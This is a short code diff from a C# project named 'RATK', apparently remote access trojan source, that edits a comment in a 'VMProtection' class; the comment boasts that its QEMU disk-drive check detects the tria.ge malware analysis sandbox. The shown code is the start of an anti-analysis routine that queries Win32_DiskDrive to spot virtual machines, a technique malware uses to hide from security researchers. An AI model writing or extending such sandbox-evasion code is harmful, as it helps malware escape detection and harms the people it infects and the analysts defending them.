@@ -9,7 +9,7 @@ namespace RATK
 {
     internal class VMProtection
     {
-        // QEMU / TRIAGE (they lettin that slide 🥀)
+        // detects tria.ge btw 🤑🤑
         public static bool QEMU_DVDROM_CHECK()
         {
             var searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
